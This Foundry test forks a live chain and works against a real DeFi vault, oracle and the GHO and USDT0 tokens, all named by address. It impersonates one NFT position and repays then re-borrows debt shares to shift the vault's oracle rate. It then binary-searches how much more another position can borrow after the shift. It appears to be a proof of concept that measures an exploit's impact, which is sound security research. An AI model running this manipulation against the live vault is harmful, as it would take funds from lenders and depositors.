// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";

interface IERC20Capacity {
    function balanceOf(address account) external view returns (uint256);
}

interface IFactoryCapacity {
    function ownerOf(uint256 nftId) external view returns (address);
}

interface IVaultT4Capacity {
    function operatePerfect(
        uint256 nftId,
        int256 perfectColShares,
        int256 colToken0MinMax,
        int256 colToken1MinMax,
        int256 perfectDebtShares,
        int256 debtToken0MinMax,
        int256 debtToken1MinMax,
        address to
    ) external payable returns (uint256, int256[] memory);
}

interface IOracleCapacity {
    function getExchangeRateOperate() external view returns (uint256);
}

contract PlasmaVaultT4OracleBorrowCapacityTest is Test {
    address internal constant FACTORY = 0x324c5Dc1fC42c7a4D43d92df1eBA58a54d13Bf2d;
    address internal constant VAULT = 0x6E0cDB09eb33cD3894C905E0DFF9289b95a86FFF;
    address internal constant ORACLE = 0x029E6fF2173ff6c9e61787Fa7A3cfF1117D957b6;
    address internal constant GHO = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;

    uint256 internal constant TARGET_NFT = 2580;
    uint256 internal constant MANIPULATOR_NFT = 2887;
    uint256 internal constant SHIFT_SHARES = 1e22;
    uint256 internal constant FUNDING = 1e28;
    int256 internal constant MAX_USDT_PAYMENT = -1e24;
    uint256 internal constant SEARCH_HIGH = 1e24;
    uint256 internal constant SEARCH_STEPS = 82;

    string internal rpcUrl;
    uint256 internal forkBlock;

    struct BorrowResult {
        bool ok;
        uint256 token0;
        uint256 token1;
    }

    event CapacityResult(
        uint256 indexed targetNft,
        uint256 indexed manipulatorNft,
        uint256 shiftShares,
        uint256 oracleBaseline,
        uint256 oracleShifted,
        int256 oracleDelta,
        uint256 baselineMaxShares,
        uint256 shiftedMaxShares,
        int256 extraShares,
        uint256 baselineToken0,
        uint256 baselineToken1,
        uint256 shiftedToken0,
        uint256 shiftedToken1,
        int256 extraToken0,
        int256 extraToken1,
        int256 extraNominal1e18
    );

    function setUp() public {
        rpcUrl = vm.envString("PLASMA_RPC_URL");
        forkBlock = vm.envUint("PLASMA_FORK_BLOCK");
        vm.createSelectFork(rpcUrl, forkBlock);
        assertEq(block.chainid, 9745, "unexpected chain");
    }

    function _approve(address token, address spender) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSignature("approve(address,uint256)", spender, type(uint256).max)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _signed(uint256 a, uint256 b) internal pure returns (int256) {
        return a >= b ? int256(a - b) : -int256(b - a);
    }

    function _applyShift() internal {
        address owner = IFactoryCapacity(FACTORY).ownerOf(MANIPULATOR_NFT);
        deal(GHO, owner, FUNDING, true);
        deal(USDT0, owner, FUNDING, true);
        vm.startPrank(owner);
        _approve(GHO, VAULT);
        _approve(USDT0, VAULT);
        IVaultT4Capacity(VAULT).operatePerfect(
            MANIPULATOR_NFT,
            0,
            0,
            0,
            -int256(SHIFT_SHARES),
            0,
            MAX_USDT_PAYMENT,
            owner
        );
        IVaultT4Capacity(VAULT).operatePerfect(
            MANIPULATOR_NFT,
            0,
            0,
            0,
            int256(SHIFT_SHARES),
            1,
            1,
            owner
        );
        vm.stopPrank();
    }

    function _attempt(bool shifted, uint256 shares) internal returns (BorrowResult memory result) {
        vm.createSelectFork(rpcUrl, forkBlock);
        if (shifted) _applyShift();

        address owner = IFactoryCapacity(FACTORY).ownerOf(TARGET_NFT);
        uint256 before0 = IERC20Capacity(GHO).balanceOf(owner);
        uint256 before1 = IERC20Capacity(USDT0).balanceOf(owner);
        vm.prank(owner);
        (result.ok,) = VAULT.call(
            abi.encodeWithSelector(
                IVaultT4Capacity.operatePerfect.selector,
                TARGET_NFT,
                int256(0),
                int256(0),
                int256(0),
                int256(shares),
                int256(1),
                int256(1),
                owner
            )
        );
        if (result.ok) {
            result.token0 = IERC20Capacity(GHO).balanceOf(owner) - before0;
            result.token1 = IERC20Capacity(USDT0).balanceOf(owner) - before1;
        }
    }

    function _maxBorrow(bool shifted) internal returns (uint256 low) {
        uint256 high = SEARCH_HIGH;
        for (uint256 i; i < SEARCH_STEPS; ++i) {
            uint256 mid = low + (high - low + 1) / 2;
            BorrowResult memory r = _attempt(shifted, mid);
            if (r.ok) low = mid;
            else high = mid - 1;
        }
    }

    function _oracle(bool shifted) internal returns (uint256 rate) {
        vm.createSelectFork(rpcUrl, forkBlock);
        if (shifted) _applyShift();
        rate = IOracleCapacity(ORACLE).getExchangeRateOperate();
    }

    function test_quantifyBorrowCapacityAfterOracleShift() public {
        uint256 oracleBaseline = _oracle(false);
        uint256 oracleShifted = _oracle(true);
        uint256 baselineMax = _maxBorrow(false);
        uint256 shiftedMax = _maxBorrow(true);

        BorrowResult memory baseline = _attempt(false, baselineMax);
        BorrowResult memory shifted = _attempt(true, shiftedMax);
        assertTrue(baseline.ok, "baseline max no longer succeeds");
        assertTrue(shifted.ok, "shifted max no longer succeeds");

        int256 extra0 = _signed(shifted.token0, baseline.token0);
        int256 extra1 = _signed(shifted.token1, baseline.token1);
        emit CapacityResult(
            TARGET_NFT,
            MANIPULATOR_NFT,
            SHIFT_SHARES,
            oracleBaseline,
            oracleShifted,
            _signed(oracleShifted, oracleBaseline),
            baselineMax,
            shiftedMax,
            _signed(shiftedMax, baselineMax),
            baseline.token0,
            baseline.token1,
            shifted.token0,
            shifted.token1,
            extra0,
            extra1,
            extra0 + extra1 * 1e12
        );
    }
}
